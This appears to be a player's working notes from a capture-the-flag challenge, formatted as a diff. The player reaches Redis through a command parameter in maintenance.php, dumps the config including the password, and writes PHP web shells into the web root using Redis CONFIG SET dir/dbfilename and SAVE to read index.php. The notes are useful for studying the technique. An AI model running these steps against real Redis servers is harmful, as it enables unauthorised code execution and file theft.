@@ -1,0 +1,316 @@
+We can use curl with http://localhost/maintenance.php?cmd=[] to interact with redis-cli
+Need to figure out what's wrong with index.php, trying to curl index.php just says something is wrong with the page and to use maintenance
+
+we're using redis-cli 5.0.3
+holly evergreen mentions an RCE issue but they couldn't get it
+
+Space: %20	
+* : %2A	
+< : %3C	
+- : %2D
+
+player@52d339279777:~$ curl http\://localhost/maintenance.php?cmd=config,get,*
+
+dbfilename
+dump.rdb
+requirepass
+R3disp@ss
+masterauth
+
+cluster-announce-ip
+
+unixsocket
+
+logfile
+
+pidfile
+/var/run/redis_6379.pid
+slave-announce-ip
+
+replica-announce-ip
+
+maxmemory
+0
+proto-max-bulk-len
+536870912
+client-query-buffer-limit
+1073741824
+maxmemory-samples
+5
+lfu-log-factor
+10
+lfu-decay-time
+1
+timeout
+0
+active-defrag-threshold-lower
+10
+active-defrag-threshold-upper
+100
+active-defrag-ignore-bytes
+104857600
+active-defrag-cycle-min
+5
+active-defrag-cycle-max
+75
+active-defrag-max-scan-fields
+1000
+auto-aof-rewrite-percentage
+100
+auto-aof-rewrite-min-size
+67108864
+hash-max-ziplist-entries
+512
+hash-max-ziplist-value
+64
+stream-node-max-bytes
+4096
+stream-node-max-entries
+100
+list-max-ziplist-size
+-2
+list-compress-depth
+0
+set-max-intset-entries
+512
+zset-max-ziplist-entries
+128
+zset-max-ziplist-value
+64
+hll-sparse-max-bytes
+3000
+lua-time-limit
+5000
+slowlog-log-slower-than
+10000
+latency-monitor-threshold
+0
+slowlog-max-len
+128
+port
+6379
+cluster-announce-port
+0
+cluster-announce-bus-port
+0
+tcp-backlog
+511
+databases
+16
+repl-ping-slave-period
+10
+repl-ping-replica-period
+10
+repl-timeout
+60
+repl-backlog-size
+1048576
+repl-backlog-ttl
+3600
+maxclients
+10000
+watchdog-period
+0
+slave-priority
+100
+replica-priority
+100
+slave-announce-port
+0
+replica-announce-port
+0
+min-slaves-to-write
+0
+min-replicas-to-write
+0
+min-slaves-max-lag
+10
+min-replicas-max-lag
+10
+hz
+10
+cluster-node-timeout
+15000
+cluster-migration-barrier
+1
+cluster-slave-validity-factor
+10
+cluster-replica-validity-factor
+10
+repl-diskless-sync-delay
+5
+tcp-keepalive
+300
+cluster-require-full-coverage
+yes
+cluster-slave-no-failover
+no
+cluster-replica-no-failover
+no
+no-appendfsync-on-rewrite
+no
+slave-serve-stale-data
+yes
+replica-serve-stale-data
+yes
+slave-read-only
+yes
+replica-read-only
+yes
+slave-ignore-maxmemory
+yes
+replica-ignore-maxmemory
+yes
+stop-writes-on-bgsave-error
+yes
+daemonize
+no
+rdbcompression
+yes
+rdbchecksum
+yes
+activerehashing
+yes
+activedefrag
+no
+protected-mode
+no
+repl-disable-tcp-nodelay
+no
+repl-diskless-sync
+no
+aof-rewrite-incremental-fsync
+yes
+rdb-save-incremental-fsync
+yes
+aof-load-truncated
+yes
+aof-use-rdb-preamble
+yes
+lazyfree-lazy-eviction
+no
+lazyfree-lazy-expire
+no
+lazyfree-lazy-server-del
+no
+slave-lazy-flush
+no
+replica-lazy-flush
+no
+dynamic-hz
+yes
+maxmemory-policy
+noeviction
+loglevel
+notice
+supervised
+no
+appendfsync
+everysec
+syslog-facility
+local0
+appendonly
+no
+dir
+/
+save
+900 1 300 10 60 10000
+client-output-buffer-limit
+normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60
+unixsocketperm
+0
+slaveof
+notify-keyspace-events
+bind
+127.0.0.1
+
+
+---
+
+can connect directly to redis-cli now w/ pass R3disp@ss
+
+accidentally set the binary data from /bin/ls in a key w/ this command
+redis-cli -a R3disp@ss -x set myTest < /bin/ls
+
+just have to find the index.php and push it to a key so i can read it?
+
+player@52d339279777:~$ redis-cli -a R3disp@ss -x set myTest < /var/www/html/index.php
+-bash: /var/www/html/index.php: Permission denied
+
+using this syntax from here: https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
+root@Urahara:~# redis-cli -h 10.85.0.52
+10.85.0.52:6379> config set dir /usr/share/nginx/html
+OK
+10.85.0.52:6379> config set dbfilename redis.php
+OK
+10.85.0.52:6379> set test "<?php phpinfo(); ?>"
+OK
+10.85.0.52:6379> save
+OK
+
+looks like files get created, curl freaks out because I have LS in there and shit
+
+going to go with this:
+<?php
+$homepage = file_get_contents('http://www.example.com/');
+echo $homepage;
+?>
+
+player@52d339279777:~$ redis-cli -a R3disp@ss
+Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
+127.0.0.1:6379> config set dir /var/www/html
+OK
+127.0.0.1:6379> config set dbfilename get.php
+OK
+127.0.0.1:6379> set indexpull "<?php $index = file_get_contents('/var/www/html/index.html');echo $index; ?>"
+OK
+127.0.0.1:6379> save
+OK
+127.0.0.1:6379> 
+
+that didn't work:
+player@52d339279777:~$ curl --output - http://localhost/get.php
+REDIS0009�      redis-ver5.0.3�
+�edis-bits�@�ctime�K��_used-mem�?�
+ aof-preamble���        indexpull�@G@example1The site is in maintenance modexample2#We think there's a bug in index.php���笐�-:player@52d339279777:~$ 
+
+ though the phpinfo did...
+
+ WRONG i'm an idiot and chose index.html in my file_get_contents, setting to index.php works
+
+ redis-cli -a R3disp@ss
+Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
+127.0.0.1:6379> config set dbfilename out.php
+OK
+127.0.0.1:6379> config set test "<?php $index = file_get_contents('/var/www/html/index.php');echo $index; ?>"
+(error) ERR Unsupported CONFIG parameter: test
+127.0.0.1:6379> set test "<?php $index = file_get_contents('/var/www/html/index.php');echo $index; ?>"
+OK
+127.0.0.1:6379> save
+OK
+127.0.0.1:6379> exit
+player@72451452ff58:~$ curl http://localhost/out.php
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+player@72451452ff58:~$ curl --output - http://localhost/out.php
+REDIS0009�      redis-ver5.0.3�
+�edis-bits�@�ctime�-��_used-mem 
+ aof-preamble���example2#We think there's a bug in index.phptest@K<?php
+
+# We found the bug!!
+#
+#         \   /
+#         .\-/.
+#     /\ ()   ()
+#       \/~---~\.-~^-.
+# .-~^-./   |   \---.
+#      {    |    }   \
+#    .-~\   |   /~-.
+#   /    \  A  /    \
+#         \/ \/
+# 
+
+echo "Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on"
+?>
+example1The site is in maintenance mode� ���3��tplayer@72451452ff58:~$ 
